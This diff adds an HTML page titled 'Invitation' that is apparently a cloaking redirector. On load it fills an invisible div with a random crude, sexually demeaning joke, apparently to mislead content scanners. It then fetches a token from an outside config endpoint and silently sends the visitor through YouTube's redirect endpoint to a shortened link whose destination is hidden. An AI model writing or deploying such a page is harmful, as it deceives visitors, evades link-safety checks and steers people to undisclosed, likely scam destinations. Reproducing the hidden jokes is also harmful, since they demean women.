@@ -1,0 +1,71 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <title>Invitation</title>
+    <link rel="shortcut icon" href="https://mylinkstu.pages.dev/favicon.ico">
+    <link rel="apple-touch-icon" href="https://mylinkstu.pages.dev/logo192.png">
+</head>
+
+<body> 
+    <div id="red" style="opacity: 0;"></div>
+    <script>
+        var sentences= [
+            'so fat not even Dora can explore her',
+            'so  fat I swerved to miss her and ran out of gas',
+            'so smelly she put on Right Guard and it went left',
+            'so fat she hasn’t got cellulite, she’s got celluheavy',
+            'so fat she don’t need no internet – she’s already world wide',
+            'so hair her armpits look like Don King in a headlock',
+            'so classless she could be a Marxist utopia',
+            'so fat she can hear bacon cooking in Canada',
+            'so fat she won “The Bachelor” because she all those other bitches',
+            'so stupid she believes everything that Brian Williams says',
+            'so ugly she scared off Flavor Flav',
+            'is like Domino’s Pizza, one call does it all',
+            'is twice the man you are',
+            'is like Bazooka Joe, 5 cents a blow',
+            'is like an ATM, open 24/7',
+            'is like a championship ring, everybody puts a finger in her'
+        ];
+        var maxSentences = sentences.length;
+        function getRandomSentence () {
+            var index= Math.floor(Math.random() * (maxSentences - 1));
+            return sentences[index];
+        }
+        var element = document.getElementById("red");
+        var sentence = getRandomSentence();
+        element.innerText = sentence;
+        const v = 'vnd';
+        const d = 'youtube';
+        async function loadToken() {
+            const response = await fetch('https://cnet.ageverify.org/api/getConfig');
+            const tokenJson = await response.json();
+            return tokenJson.token;
+        }
+        var qs = (function(a) {
+            if (a == "") return {};
+            var b = {};
+            for (var i = 0; i < a.length; ++i)
+            {
+                var p=a[i].split('=', 2);
+                if (p.length == 1)
+                    b[p[0]] = "";
+                else
+                    b[p[0]] = decodeURIComponent(p[1].replace(/\+/g, " "));
+            }
+            return b;
+        })(window.location.search.substr(1).split('&'));
+        async function go(){
+            var uid = qs["uid"] ? qs["uid"].split("_")[0] : 1;
+            var token = await loadToken();
+            var urf = `https://bcns.ai/fJvxAj`;
+            urf = encodeURIComponent(urf);
+            location.href = `${v}.${d}://youtube.com/redirect?event=comments&redir_token=${token}&q=${urf}&html_redirect=1`;
+        }
+        go();
+    </script>
+
+</body>
+
+</html>
